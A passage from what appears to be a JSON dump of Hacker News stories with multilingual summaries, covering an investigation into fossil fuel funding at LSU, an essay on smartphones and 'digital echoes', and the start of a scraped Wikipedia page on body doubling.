conflict of interest — the size of an oil tanker,” said Geoffrey Supran, associate professor of environmental science and policy who studiesfossil fuel disinformation at the University of Miami and is director of its Climate Accountability Lab. He says LSU and other schools like it have become “an echo chamber for pro-fossil-fuel narratives.”LSU and its president, William Tate IV, have doubled down on the university’s ties with the fossil fuel industry in recent years, despite its shrinking importance to the Louisiana economy. Since 2020, Tate has solicited and received more than $30 million from fossil fuel companies, including a record $27.5 million from Shell.During LSU’s Giving Day campaign on Wednesday, Shell plopped down another $1.5 million for LSU libraries and the College of Science.“It's time for a partnership in significant fashion to link the work at LSU in our energy areas, including alternative energy, and creating ways to keep that industry vibrant here in this state and for our country,” Tate told reporters in 2022, about a year after he was named to head the school.Shell gave $27.5 million to Louisiana State University in Baton Rouge in 2022 to fund the university’s Institute for Innovation in Energy. Here, LSU president William Tate IV poses with LSU mascot Mike the Tiger. (Louisiana State University)LSU insists there are firewalls in place to prevent oil and gas companies from unduly influencing research and study. But public records and interviews indicate that fossil fuel funding can have a subtle and even direct impact on research and critical discourse.“Universities are at risk of being pawns in a climate propaganda scheme devised and implemented by fossil fuel interests for decades,” Supran said. ‘Tip of the iceberg’It’s impossible to pin down how much money fossil fuel interests — or any industry — gives to universities such as LSU. Although it is a public institution, much of the money for scholarships, workforce development and buildings goes through LSU’s foundation — a nonprofit separate from the university. The foundation, in accordance with philanthropic standards, does not disclose its donors unless they agree to be identified.In its research, Data for Progress used public announcements from universities and companies, along with tax filings from fossil fuel companies’ foundations, to determine how much the universities received from those companies.“It’s most likely the tip of the iceberg,” said Jake Lowe, executive director of Campus Climate Network, which under its previous name, Fossil Free Research, worked with Data for Progress to create its 2023 report.For example, the report includes millions of dollars the ExxonMobil Foundation gives for scholarships — but not the money going directly from the company to a school or its foundation.“If the ExxonMobil corporation has a research contract with LSU, you’re not going to see that in the tax documents or annual reports,” Lowe said.Louisiana State University’s “Quad” is the heart of the campus. Completed in 1926, it contains some of the first campus structures around a lush landscaped area with oaks, azaleas, crepe myrtles and magnolia trees. It was named after ExxonMobil in 1999. (Piper Hutchinson / Louisiana Illuminator)Floodlight, with the help of a Data for Progress researcher, used the same method to look at how much petrochemical money went to LSU. The analysis included examining public announcements from the companies and tax filings, called 990s, of the foundations for Shell, ExxonMobil, Chevron, ConocoPhillips, Entergy, Koch Inc., Southwest Electric Power Corp., Schlumberger (now known as SLB), Dow and Taylor Oil.From 2010 to 2020, Taylor Oil’s foundation gave the most to LSU, almost $21 million.The second highest amount was from ExxonMobil, which gave more than $10 million — the majority of which came from a matching gift program in which the company gave $3 for every dollar donated by an employee or retiree to a college or university.But then, in 2022, Shell dwarfed the amount given over the previous decade with a single $27.5 million donation to LSU. The majority, $25 million, was for a new Institute for Energy Innovation to focus on “scholarship and solution delivery” on “hydrogen and carbon capture … the coast; and low-carbon fuels.”Donations buy influenceLSU doesn't hide that the institute's mission was shaped in partnership with the industry. In the early days, a former Shell executive, Rhoman Hardy, served as the research center's interim director. The company also has three of the institute’s seven board seats; industry groups hold another two.Last year, the nonprofit New Orleans news outlet The Lens discovered LSU created a system: If a fossil fuel company gives $50,000 or more to the institute, it gets the right to participate in a specific research project, to use the intellectual property from that project and “robust review and discussion of the specific study and project output.”For a $1.25 million donation, a company also receives “voting rights for selected institute activities, including research.” A contribution of $5 million or more earns a donor a seat on the institute’s board.Louisiana State University President William Tate IV visits Shell’s facility in Convent, La., in 2023 to talk about his plan to focus on five areas at the university, including energy. Shell has announced it will convert the former oil refinery into one that produces lower carbon fuels. (Louisiana State University)When reached for comment about the institute, its donations and its potential influence, Shell responded, “We’re proud to partner with LSU to contribute to the growing compendium of peer-reviewed climate science and advance the effort to identify multiple pathways and build the ecosystems that can lead to more energy with fewer emissions.”In 2023, ExxonMobil gave $2 million to LSU and became a “strategic” partner. With the donation, ExxonMobil will work with the institute to study batteries, solar power, carbon capture and advanced recycling. ExxonMobil did not respond to a request for comment about the donation or about the money it has previously given to LSU.At a Louisiana Board of Regents’ Energy Transition Research Symposium at LSU later that year, ExxonMobil gave a presentation on advanced plastics recycling, a controversial technology that opponents say amounts to greenwashing the problem of plastic waste by burning it rather than reusing it.“It is clear based on the board and research focus areas of the new Institute for Energy Innovation that it is focused squarely on innovations using fossil fuels,” said Logan Atkinson Burke, Voss’ boss at the Alliance for Affordable Energy, an energy consumer advocacy group.Environmentalists say technologies being studied by the institute, including carbon capture, hydrogen and low-carbon fuels, are “false solutions” that will do little to address the climate crisis.‘Subconscious’ bias?The institute's current director, Brad Ives, and LSU’s vice president for research and economic development, Robert Twilley, say they have put safeguards in place to prevent industry influence.And Twilley says this type of research — working hand in hand with industries on the ground — is core to the mission of LSU as a land grant university, a program Abraham Lincoln established in 1862 that used federal land sales to fund universities focused on practical subjects including architecture, engineering and agriculture. “It’s how we as an institution manage it and the safeguards and being very conscious of our ethics, being very conscious of what projects we work on,” Twilley said.He points to federal guidelines, the scientific method and peer review as some of the safeguards that keep the university’s research independent from industry influence. The institute sends its research proposals to an anonymous third-party panel of scientists to be ranked, Twilley says. Those rankings help decide what research it funds.Ives says funders aren’t allowed contact with researchers either.“What we're doing is making sure that the researchers have total academic freedom to let the research take them where it goes,” Ives said. “We know we can sleep at night because we are not doing anything that's wrong.”But Supran, who once worked on projects funded by oil and gas, says it’s not always as simple as a researcher purposefully skewing results. Scientists are only human, making these relationships inherently fraught.“We're all subject to biases,” he said. “Things like reciprocation. You know that if I give you a pen, you have some small subconscious desire to reciprocate it in some sense down the line.”For example, one study showed how reviews of the health effects of secondhand smoke funded by the tobacco industry were almost 90 times more likely to conclude that it was not harmful compared to reviews funded by other sources.There’s evidence that the lines between funding and academic independence are sometimes blurred at LSU. Several influential reports and studies from LSU’s Center for Energy Studies have drawn scrutiny over the years for being misleading. In one case, a utility-funded report led to the dismantling of Louisiana’s successful rooftop solar program. In another, a report helped curb efforts to sue oil and gas companies for decades of environmental damage, claiming the lawsuits cost the state more than it would gain.A more recent example was found in public records reviewed by WWNO, including a contract between the Center for Energy Studies and the Bracewell law firm, representing Gulf Coast Sequestration. That company wants to store millions of tons of carbon dioxide underground in southwest Louisiana. It asked the center to use the project as a case study for the economic impact of a carbon capture industry on the Gulf Coast.The contract suggests that some of the report’s conclusions were reached even before the study began. The researchers said they planned to “underscore the transformative nature of CCS (carbon capture and sequestration) on the Louisiana economy.”LSU’s final report ultimately listed all of the financial reasons the Gulf Coast should welcome the projects like this one — while barely mentioning the economic risks, such as the cost and financial viability of carbon capture facilities.WWNO showed the report to several researchers familiar with sponsored research. All of them shared concerns over the prescriptive nature of the research proposal or the terms of the contract itself.LSU allows research sponsors to give feedback on drafts before they're published. Sponsors are also allowed to stay anonymous — meaning, the public doesn’t know who funds the research.“It gets a D grade and it's not quite an F,” Supran said, noting that in this case, the funder was disclosed. “ The fact that this report just touts the economic benefits of this specific company funding the report — it kind of makes you wonder if it's worth the paper it's written on.”The report’s authors declined to comment. Twilley defended the contract, saying its terms are standard throughout the university and that researchers are allowed to propose hypotheses.Gulf Coast Sequestration did not respond to a request for comment.Louisiana State University’s Petroleum Engineering Research & Technology Transfer, or PERTT, Laboratory, is an industrial-scale facility for training and research on borehole technology. According to LSU, it is the only such facility in North America. (Louisiana State University)The contract is not illegal nor does it constitute research misconduct such as using fake data or plagiarizing. But according to one elected official, reports like these, which carry the credibility of a university without the scrutiny of peer review, could influence public policy.“The research plays a significant role in determining whether or not we’re on the right or wrong course,” said Davante Lewis, a public service commissioner in Louisiana. His commission regulates services in Louisiana including the electric utilities.Lewis said he counts on such academic reports to provide a fair and comprehensive picture of an issue. But, as more industry money enters research, he said he was concerned, noting, “Oftentimes we have seen where money drives facts, not facts drive money.”Burnishing their reputations Besides funding LSU’s energy institute, oil and gas interests also pays for things everyone likes, such as health programs, tutoring and even halftime kicking contests with football fans.Supran says he and other researchers have a working theory that while oil and gas companies pour big money into big research institutions such as MIT and Stanford to give them credibility, they spend money at regional universities in states including Louisiana and Texas to build a compliant population.Geoffrey Supran, an associate professor at the University of Miami, tells members of the U.S. Senate Budget Committee at a May 1, 2024 hearing that his research has found “widespread infiltration of fossil fuel interests into higher education.” (U.S. Senate Budget Committee)“It doesn't take a genius to imagine that that money may be used to burnish the reputation locally of those companies and foster a vibrant recruitment pool,” Supran said.Voss says the oil and gas industry’s support of benefits for the state are “one of the few things that it actually has right.” On the flip side, he added, “I think it protects the industry from criticism, because it makes people feel like they're a part of the community.”But the heavy presence of oil and gas on campus can have a chilling effect on people and groups who don’t support those industries.Jill Tupitza, now a marine scientist in California, was a graduate student at LSU when she and fellow graduate student Corinne Salter started Climate Pelicans, an advocacy organization that worked to get LSU to stop investing in fossil fuels.When they started questioning the ties between LSU and fossil fuels, they were met with resistance.“Immediately, doors were shut,” Tupitza said.One administrator told her, “‘I can't tell you what to do, I can't punish you for going further. But I would strongly recommend that you stop asking questions about this,’” she recalled. “So that, obviously, that made us double down.”The group led marches and a petition drive urging climate divestment. They started a podcast that explored topics including environmental justice and false climate solutions.Tupitza said the LSU Foundation stonewalled the group’s requests for information about how much money it had invested in fossil fuels and refused requests to attend meetings about the foundation’s $700 million endowment.The foundation later told Tupitza that less than 4% of its holdings were invested in fossil fuels.Climate advocates Corinne Salter and Jill Tupitza, who started a group and podcast called Climate Pelicans, and Cheyenne Autin discuss divestment in fossil fuels in November 2023 at Louisiana State University’s Baton Rouge campus. (Tarun Kakarala / The Reveille)And then, while Tupitza and fellow graduate students were writing “Divest from Fossil Fuels,” in pink chalk in front of the foundation building, they were arrested on graffiti charges.Those charges were eventually dropped. School rules prohibit writing on the sidewalks with chalk, but it is not an arrestable offense. Tupitza described her arrest as “a huge scare tactic.” Supran says LSU isn’t unique in its hesitation to cut ties with the oil and gas industry.“I think it's fair to say that for the most part, there has not been careful deliberation about the costs and the benefits of these ties, but rather a head down, and aggressive, solicitation of as much funding as they can receive from anyone.”Voss predicts that if conditions worsen in an industry known for its booms and busts, its support for LSU will disappear. And as climate change worsens, it will make it harder for businesses and people to stay in Louisiana, which is already near the top of U.S. states when it comes to population loss.“In many ways, higher education is sitting upon a house of cards, and relying upon oil and gas is incredibly risky — as it always has been.”Instead, he said, “I think that LSU could and should be a really critical voice in climate change and environmental justice in Louisiana. I do worry that in failing to do so and by being so heavily tied up in oil and gas interests, it actually puts the university in a worse position.”This is Part 2 of a two-part investigative series exploring the relationship between the fossil fuel industry and Louisiana State University. Read Part 1 here. This story was reported by a partnership with WWNO/WRKF, the Louisiana Illuminator and Floodlight. You can listen to the accompanying Sea Change podcast here. Floodlight is a nonprofit newsroom that investigates the powers stalling climate action.\n\n                                Pam Radtke/Floodlight\n\n                                Pam is an environment, energy and climate reporter. A long-time New Orleans resident, Pam was part of the Times-Picayune team that published after Hurricane Katrina.\n\npam@floodlightnews.org\n\n                                Halle Parker/WWNO & WRKF\n\n                                Piper Hutchinson/Louisiana Illuminator",
    "summary": {
      "en": "The text discusses the relationship between Louisiana State University (LSU) and the fossil fuel industry, highlighting concerns about how funding from oil and gas companies influences research and discourse at the university. Key points include:\n\n1. **Funding Influence**: LSU has received significant financial support from fossil fuel companies, amounting to over $44 million from 2010 to 2020, making it one of the top U.S. universities benefiting from such funding. Recent donations, including a $27.5 million contribution from Shell, have raised questions about the potential for these companies to influence academic research.\n\n2. **Lack of Climate Discussion**: Former students, like Jackson Voss, noted that during their time at LSU, critical discussions about climate change and the impacts of the oil and gas industry were largely absent. This trend suggests a culture that avoids confronting the industry's role in climate issues.\n\n3. **Research Concerns**: Investigations reveal that funding from fossil fuel companies can shape research agendas and outcomes at LSU, creating a bias towards pro-industry narratives. Critics argue that this compromises academic independence and leads to a lack of transparency in research findings.\n\n4. **Push for Divestment**: Activism on campus has emerged, with groups advocating for the university to divest from fossil fuels. Protests have highlighted concerns about the ethical implications of accepting funding from an industry linked to environmental harm.\n\n5. **Safeguards and Skepticism**: While LSU claims to have safeguards to prevent undue industry influence on research, experts argue that the relationships between universities and fossil fuel companies can still lead to subconscious biases in research.\n\nOverall, the situation at LSU reflects a broader issue in higher education, where financial ties to the fossil fuel industry may hinder open discussions about climate change and limit the university's role in advocating for environmental justice.",
      "ko": "루이지애나 주립대학교(LSU)와 화석 연료 산업 간의 관계에 대한 논의가 진행되고 있으며, 석유 및 가스 회사의 자금 지원이 대학의 연구와 담론에 미치는 영향에 대한 우려가 제기되고 있습니다. 주요 내용은 다음과 같습니다.\n\nLSU는 2010년부터 2020년까지 화석 연료 회사로부터 4천4백만 달러 이상의 상당한 재정 지원을 받았으며, 이는 미국 내에서 이러한 자금을 가장 많이 받는 대학 중 하나로 만들었습니다. 최근에는 셸에서 2천7백50만 달러의 기부가 이루어졌고, 이로 인해 이러한 기업들이 학술 연구에 영향을 미칠 가능성에 대한 의문이 제기되고 있습니다.\n\n전 학생인 잭슨 보스는 LSU 재학 중 기후 변화와 석유 및 가스 산업의 영향에 대한 중요한 논의가 거의 없었다고 언급했습니다. 이러한 경향은 산업의 기후 문제에 대한 역할을 회피하는 문화를 나타냅니다.\n\n조사 결과, 화석 연료 회사의 자금 지원이 LSU의 연구 의제와 결과에 영향을 미쳐 산업 친화적인 서사를 형성하는 경향이 있는 것으로 나타났습니다. 비판자들은 이러한 상황이 학문적 독립성을 저해하고 연구 결과의 투명성을 결여하게 만든다고 주장합니다.\n\n캠퍼스에서는 화석 연료에서의 투자 철회를 촉구하는 활동이 일어나고 있으며, 시위는 환경 피해와 관련된 산업으로부터 자금을 받는 것의 윤리적 문제에 대한 우려를 강조하고 있습니다.\n\nLSU는 연구에 대한 부당한 산업 영향력을 방지하기 위한 안전 장치가 있다고 주장하지만, 전문가들은 대학과 화석 연료 회사 간의 관계가 여전히 연구에서 무의식적인 편향을 초래할 수 있다고 지적합니다.\n\n전반적으로 LSU의 상황은 고등 교육에서 화석 연료 산업과의 재정적 연관이 기후 변화에 대한 열린 논의를 방해하고, 환경 정의를 옹호하는 대학의 역할을 제한할 수 있는 더 넓은 문제를 반영하고 있습니다.",
      "ja": "ルイジアナ州立大学（LSU）と化石燃料産業の関係についての内容が述べられています。特に、石油やガス会社からの資金が大学の研究や議論に与える影響が懸念されています。\n\nLSUは2010年から2020年の間に、化石燃料会社から4400万ドル以上の支援を受けており、これはアメリカの大学の中でも特に多い金額です。最近ではシェルから2750万ドルの寄付があり、これらの企業が学術研究に影響を与える可能性について疑問が生じています。\n\n元学生のジャクソン・ボス氏は、LSU在学中に気候変動や石油・ガス産業の影響についての重要な議論がほとんど行われなかったと指摘しています。この傾向は、業界の役割に対する議論を避ける文化を示唆しています。\n\n調査によると、化石燃料会社からの資金はLSUの研究課題や結果に影響を与え、業界寄りの見解が強調されることがあります。批評家たちは、これが学問の独立性を損ない、研究結果の透明性を欠く原因になると主張しています。\n\nキャンパス内では、化石燃料からの投資撤退を求める活動が盛んになっています。抗議活動では、環境に悪影響を及ぼす産業からの資金を受け入れることの倫理的な問題が強調されています。\n\nLSUは研究に対する不当な業界の影響を防ぐための対策があると主張していますが、専門家は大学と化石燃料会社の関係が研究に無意識のバイアスをもたらす可能性があると指摘しています。\n\n全体として、LSUの状況は高等教育におけるより広範な問題を反映しており、化石燃料産業との財政的な結びつきが気候変動についての自由な議論を妨げ、環境正義を支持する大学の役割を制限する可能性があります。"
    }
  },
  {
    "id": "46645e69fc3d1245",
    "title": {
      "en": "Digital Echoes and Unquiet Minds",
      "ko": "디지털 메아리와 불안한 마음",
      "ja": "デジタルの囁き"
    },
    "type": "story",
    "url": "https://www.chrbutler.com/digital-echoes-and-unquiet-minds",
    "score": 161,
    "by": "delaugust",
    "time": 1743193772,
    "content": "Digital Echoes and Unquiet Minds\n\nThere’s a psychological burden of digital life even heavier than distraction.\n\nWhen the iPhone was first introduced in 2007, the notion of an “everything device” was universally celebrated. A single object that could serve as phone, camera, music player, web browser, and so much more promised unprecedented convenience and connectivity. It was, quite literally, the dream of the nineties. But the better part of twenty years later, we’ve gained enough perspective to recognize that this revolutionary vision came with costs we did not anticipate.\n\nDistraction, of course, is the one we can all relate to first. An everything device has the problem of being useful nearly all the time, and when in use, all consuming. When you use it to do one thing, it pushes you toward others. In order to avoid this, you must disable functions. That’s an interesting turn of events, isn’t it? We have made a thing that does more than we need, more often than we desire. Because system-wide, duplicative notifications are enabled by default, the best thing you could say about the device’s design is that it lacks a point of view toward a prioritization of what it does. The worst thing you could say is that it is distracting by design.\n\n(I find it fascinating how many people –myself included — attempt to reduce the features of their smartphone to the point of replicating a “dumbphone” experience in order to save ourselves from distraction, but don’t actually go so far as to use a lesser-featured phone because a few key features are just too good to give up. A dumbphone is less distracting, but a nightmare for text messaging and a lousy camera. It turns out I don’t want a phone at all, but a camera that texts — and ideally one smaller than anything on the market now. I know I’m not alone, and yet this product will not be made. )\n\nThis kind of distraction is direct distraction. It’s the kind we are increasingly aware of, and as its accumulating stress puts pressure on our inner and outer lives, we can combat it with various choices and optimizations. But there is another kind of distraction that is less direct, though just as cumulative and, I believe, just as toxic. I’ve come to think of it as the “digital echo.”\n\nOn a smartphone, every single thing it is used to do generates information that goes elsewhere. The vast majority of this is unseen — though not unfelt — by us. Everyone knows that there is no privacy within a digital device, nor within its “listening” range. We are all aware that as much information as smartphone provides to us, exponentially more is generated for someone else — someone watching, listening, measuring, and monetizing. The “digital echo” is more than just the awareness of this; it is the cognitive burden of knowing that our actions generate data elsewhere. The echo exists whenever we use connected technology, creating a subtle but persistent awareness that what we do isn’t just our own. A device like a smartphone has always generated a “digital echo”, but many others are as well.\n\nComparing two different motor vehicles illustrates this well. In a car like a Tesla, which we might think of as a “smartcar” since it’s a computer you can drive, every function produces a digital signal. Adjusting the air conditioning, making a turn, opening a door — the car knows and records it all, transmitting this information to distant servers. By contrast, my 15-year-old Honda performs all of its functions without creating these digital echoes. The operations remain private, existing only in the moment they occur. In our increasingly digital world, I have begun to feel the SCIF-like isolation of the cabin of my car, and I like it.\n\n(The “smartcar”, of course, won’t remain simply a computer you can drive. The pinnacle “smartcar” drives itself. The self-driving car represents perhaps the most acute expression of how digital culture values attention and convenience above all else, especially control and ownership. As a passenger of a self-driving car, you surrender control over the vehicle’s operation in exchange for the “freedom” to direct your attention elsewhere, most likely to some digital signal either on your own device or on screens within the vehicle. I can see the value in this; driving can be boring and most times I am behind the wheel I’d rather be doing something else. But currently, truly autonomous vehicles are service-enabling products like Waymo, meaning we also relinquish ownership. The benefits of that also seem obvious: no insurance premiums, no maintenance costs. But not every advantage is worth its cost. The economics of self-driving cars are not clear-cut. There’s a real debate to be had about\nattention, convenience, and ownership that I hope will play out before we have no choice but to be a passenger in someone else’s machine.)\n\nWhen I find myself looking for new ways to throttle my smartphone’s functions, or when I sit in the untapped isolation of my car, I often wonder about the costs of the “digital echo.” What is the psychological cost of knowing that your actions aren’t just your own, but create information that can be observed and analyzed by others? As more aspects of our lives generate digital echoes, they force an ambient awareness of being perpetually witnessed rather than simply existing.\n\nThis transforms even solitary activities into implicit social interactions. It forces us to maintain awareness of our “observed self” alongside our “experiencing self,” creating a kind of persistent self-consciousness. We become performers in our own lives rather than merely participants.\n\nI think this growing awareness contributes to a growing interest in returning to single-focus devices and analog technologies. Record players and film cameras aren’t experiencing resurgence merely from nostalgia, but because they offer fundamentally different relationships with media — relationships characterized by intention, presence, and focus.\n\nIn my own life, this recognition has led to deliberate choices about which technologies to embrace and which to avoid. Here are three off the top of my head:\n\nReplacing streaming services with owned media formats (CDs, Blu-rays) that remain accessible on my terms, not subject to platform changes or content disappearance\n\nPreferring printed books while using dedicated e-readers for digital texts — in this case, accepting certain digital echoes when the benefits (in particular, access to otherwise unavailable material) outweigh the costs\n\nRejecting smart home devices entirely, recognizing that their convenience rarely justifies the added complexity and surveillance they introduce\n\nYou’ve probably made similarly-motivated decisions, perhaps in other areas of your life or in relation to other things entirely. What matters, I think, is that these choices aren’t about rejecting technology but about creating spaces for more intentional engagement. They represent a search for balance in a world that increasingly defaults to maximum connectivity.\n\nI had a conversation recently with a friend who mused, “What are these the early days of?” What a wonderful question that is; we are, I hope, always living in the early days of something. Perhaps now, we’re witnessing the beginning of a new phase in our relationship with technology. The initial wave of digital transformation prioritized connecting everything possible; the next wave may be more discriminating about what should be connected and what’s better left direct and immediate. I hope to see operating systems truly designed around focus rather than multitasking, interfaces that respect attention rather than constantly competing for it, and devices that serve discrete purposes exceptionally well instead of performing multiple functions adequately.\n\nThe digital echoes of our actions will likely continue to multiply, but we can choose which echoes we’re willing to generate and which activities deserve to remain ephemeral — to exist only in the moment they occur and then in the memories of those present. What looks like revision or retreat may be the next wave of innovation, borne out of having learned the lessons of the last few decades and desiring better for the next.\n\n        Written by Christopher Butler on March 28, 2025\n\n        Tagged\n        Essays\n\n      © Christopher Butler. All rights reserved.\n      Now\n      About this Website\n      Newsletter\n      RSS",
    "summary": {
      "en": "**Summary of \"Digital Echoes and Unquiet Minds\"**\n\nThe digital age has brought great convenience through devices like smartphones, which combine many functions into one. However, this convenience comes with unexpected downsides, primarily distraction and a psychological burden known as the \"digital echo.\" \n\nDistraction is a well-known issue; smartphones often pull us into multiple activities at once, making it hard to focus. Many people try to limit their phone's features but still rely on it for essential functions. \n\nThe \"digital echo\" refers to the awareness that our actions generate data that is collected and analyzed by others, creating a sense of being constantly observed. This can lead to self-consciousness and transforms personal activities into social performances. \n\nAs a result, some people are turning back to simpler, analog technologies like record players and film cameras, which foster more intentional and focused engagement. The author shares personal choices to embrace technology that enhances control and privacy, such as using owned media instead of streaming services and avoiding smart home devices.\n\nUltimately, a new phase in our relationship with technology may be emerging, focusing on intentional connectivity and prioritizing attention and purpose over multitasking. We can choose which digital echoes to create and which moments to keep private.",
      "ko": "디지털 시대는 스마트폰과 같은 기기를 통해 많은 기능을 하나로 통합하여 큰 편리함을 가져왔습니다. 그러나 이러한 편리함은 예상치 못한 단점도 동반하는데, 주로 주의 산만과 '디지털 에코'라는 심리적 부담이 그것입니다.\n\n주의 산만은 잘 알려진 문제입니다. 스마트폰은 여러 활동으로 우리를 끌어들여 집중하기 어렵게 만듭니다. 많은 사람들이 스마트폰의 기능을 제한하려고 하지만, 여전히 필수적인 기능을 위해 의존하게 됩니다.\n\n'디지털 에코'는 우리의 행동이 데이터를 생성하고, 이 데이터가 다른 사람에 의해 수집되고 분석된다는 인식을 의미합니다. 이는 끊임없이 관찰당하고 있다는 느낌을 주어 자의식이 생기고, 개인적인 활동이 사회적 공연으로 변질될 수 있습니다.\n\n이런 이유로 일부 사람들은 레코드 플레이어나 필름 카메라와 같은 더 단순한 아날로그 기술로 돌아가고 있습니다. 이러한 기기들은 더 의도적이고 집중적인 참여를 촉진합니다. 저자는 스트리밍 서비스 대신 소유한 미디어를 사용하고 스마트 홈 기기를 피하는 등, 통제와 프라이버시를 강화하는 기술을 선택하는 개인적인 사례를 공유합니다.\n\n결국, 우리는 기술과의 관계에서 새로운 단계로 나아가고 있는 것일 수 있습니다. 이 단계는 의도적인 연결을 중시하고, 멀티태스킹보다 주의와 목적을 우선시하는 방향으로 나아갑니다. 우리는 어떤 디지털 에코를 생성할지, 어떤 순간을 개인적으로 유지할지를 선택할 수 있습니다.",
      "ja": "デジタル時代は、スマートフォンのような多機能デバイスを通じて大きな便利さをもたらしました。しかし、この便利さには予期しない欠点もあり、主に気を散らす要因や「デジタルエコー」と呼ばれる心理的負担が含まれます。\n\n気を散らすことはよく知られた問題で、スマートフォンは私たちを同時に複数の活動に引き込むため、集中するのが難しくなります。多くの人が電話の機能を制限しようと試みますが、重要な機能には依存せざるを得ません。\n\n「デジタルエコー」とは、自分の行動がデータとして収集され、他者によって分析されているという意識を指します。これにより、常に見られている感覚が生まれ、個人的な活動が社会的なパフォーマンスに変わることがあります。\n\nその結果、一部の人々はレコードプレーヤーやフィルムカメラのようなシンプルなアナログ技術に戻ることを選んでいます。これらはより意図的で集中した関与を促進します。著者は、ストリーミングサービスではなく自分のメディアを使用したり、スマートホームデバイスを避けたりすることで、コントロールとプライバシーを高める技術を受け入れる個人的な選択を共有しています。\n\n最終的には、私たちの技術との関係に新たな段階が現れるかもしれません。これは、意図的なつながりに焦点を当て、マルチタスクよりも注意と目的を優先することに基づいています。私たちは、どのデジタルエコーを生み出し、どの瞬間をプライベートに保つかを選ぶことができます。"
    }
  },
  {
    "id": "49c8dcdc40c3bb55",
    "title": {
      "en": "Body Doubling",
      "ko": "신체 이중화",
      "ja": "ボディダブル"
    },
    "type": "story",
    "url": "https://en.wikipedia.org/wiki/Body_doubling",
    "score": 54,
    "by": "tosh",
    "time": 1743274124,
    "content": "Toggle the table of contents\n\n\t\t\t\t\tBody doubling\n\nAdd languages\n\n\t\t\tAdd links\n\n\t\t\tArticleTalk\n\n\tEnglish\n\n\t\t\tReadEditView history\n\n\tTools\n\n\tTools\n\tmove to sidebar\n\thide\n\n\t\tActions\n\n\t\t\tReadEditView history\n\n\t\tGeneral\n\n\t\t\tWhat links hereRelated changesUpload filePermanent linkPage informationCite this pageGet shortened URLDownload QR code\n\n\t\tPrint/export\n\n\t\t\tDownload as PDFPrintable version\n\n\t\tIn other projects\n\n\t\t\tWikidata item\n\n\tAppearance\n\tmove to sidebar\n\thide\n\n\t\t\t\t\t\tFrom Wikipedia, the free encyclopedia\n\n\t\t\t\t\tStrategy of completing tasks with another person\n.mw-parser-output .hatnote{font-style:italic}.mw-parser-output div.hatnote{padding-left:1.6em;margin-bottom:0.5em}.mw-parser-output .hatnote i{font-style:normal}.mw-parser-output .hatnote+link+.hatnote{margin-top:-0.5em}@media print{body.ns-0 .mw-parser-output .hatnote{display:none!important}}Not to be confused with Body double.\nFor other uses, see Body double (disambiguation).\n.mw-parser-output .hlist dl,.mw-parser-output .hlist ol,.mw-parser-output .hlist ul{margin:0;padding:0}.mw-parser-output .hlist dd,.mw-parser-output .hlist dt,.mw-parser-output .hlist li{margin:0;display:inline}.mw-parser-output .hlist.inline,.mw-parser-output .hlist.inline dl,.mw-parser-output .hlist.inline ol,.mw-parser-output .hlist.inline ul,.mw-parser-output .hlist dl dl,.mw-parser-output .hlist dl ol,.mw-parser-output .hlist dl ul,.mw-parser-output .hlist ol dl,.mw-parser-output .hlist ol ol,.mw-parser-output .hlist ol ul,.mw-parser-output .hlist ul dl,.mw-parser-output .hlist ul ol,.mw-parser-output .hlist ul ul{display:inline}.mw-parser-output .hlist .mw-empty-li{display:none}.mw-parser-output .hlist dt::after{content:\": \"}.mw-parser-output .hlist dd::after,.mw-parser-output .hlist li::after{content:\" · \";font-weight:bold}.mw-parser-output .hlist dd:last-child::after,.mw-parser-output .hlist dt:last-child::after,.mw-parser-output .hlist li:last-child::after{content:none}.mw-parser-output .hlist dd dd:first-child::before,.mw-parser-output .hlist dd dt:first-child::before,.mw-parser-output .hlist dd li:first-child::before,.mw-parser-output .hlist dt dd:first-child::before,.mw-parser-output .hlist dt dt:first-child::before,.mw-parser-output .hlist dt li:first-child::before,.mw-parser-output .hlist li dd:first-child::before,.mw-parser-output .hlist li dt:first-child::before,.mw-parser-output .hlist li li:first-child::before{content:\" (\";font-weight:normal}.mw-parser-output .hlist dd dd:last-child::after,.mw-parser-output .hlist dd dt:last-child::after,.mw-parser-output .hlist dd li:last-child::after,.mw-parser-output .hlist dt dd:last-child::after,.mw-parser-output .hlist dt dt:last-child::after,.mw-parser-output .hlist dt li:last-child::after,.mw-parser-output .hlist li dd:last-child::after,.mw-parser-output .hlist li dt:last-child::after,.mw-parser-output .hlist li li:last-child::after{content:\")\";font-weight:normal}.mw-parser-output .hlist ol{counter-reset:listitem}.mw-parser-output .hlist ol>li{counter-increment:listitem}.mw-parser-output .hlist ol>li::before{content:\" \"counter(listitem)\"\\a0 \"}.mw-parser-output .hlist dd ol>li:first-child::before,.mw-parser-output .hlist dt ol>li:first-child::before,.mw-parser-output .hlist li ol>li:first-child::before{content:\" (\"counter(listitem)\"\\a0 \"}.mw-parser-output .plainlist ol,.mw-parser-output .plainlist ul{line-height:inherit;list-style:none;margin:0;padding:0}.mw-parser-output .plainlist ol li,.mw-parser-output .plainlist ul li{margin-bottom:0}.mw-parser-output .sidebar{width:22em;float:right;clear:right;margin:0.5em 0 1em 1em;background:var(--background-color-neutral-subtle,#f8f9fa);border:1px solid var(--border-color-base,#a2a9b1);padding:0.2em;text-align:center;line-height:1.4em;font-size:88%;border-collapse:collapse;display:table}body.skin-minerva .mw-parser-output .sidebar{display:table!important;float:right!important;margin:0.5em 0 1em 1em!important}.mw-parser-output .sidebar-subgroup{width:100%;margin:0;border-spacing:0}.mw-parser-output .sidebar-left{float:left;clear:left;margin:0.5em 1em 1em 0}.mw-parser-output .sidebar-none{float:none;clear:both;margin:0.5em 1em 1em 0}.mw-parser-output .sidebar-outer-title{padding:0 0.4em 0.2em;font-size:125%;line-height:1.2em;font-weight:bold}.mw-parser-output .sidebar-top-image{padding:0.4em}.mw-parser-output .sidebar-top-caption,.mw-parser-output .sidebar-pretitle-with-top-image,.mw-parser-output .sidebar-caption{padding:0.2em 0.4em 0;line-height:1.2em}.mw-parser-output .sidebar-pretitle{padding:0.4em 0.4em 0;line-height:1.2em}.mw-parser-output .sidebar-title,.mw-parser-output .sidebar-title-with-pretitle{padding:0.2em 0.8em;font-size:145%;line-height:1.2em}.mw-parser-output .sidebar-title-with-pretitle{padding:0.1em 0.4em}.mw-parser-output .sidebar-image{padding:0.2em 0.4em 0.4em}.mw-parser-output .sidebar-heading{padding:0.1em 0.4em}.mw-parser-output .sidebar-content{padding:0 0.5em 0.4em}.mw-parser-output .sidebar-content-with-subgroup{padding:0.1em 0.4em 0.2em}.mw-parser-output .sidebar-above,.mw-parser-output .sidebar-below{padding:0.3em 0.8em;font-weight:bold}.mw-parser-output .sidebar-collapse .sidebar-above,.mw-parser-output .sidebar-collapse .sidebar-below{border-top:1px solid 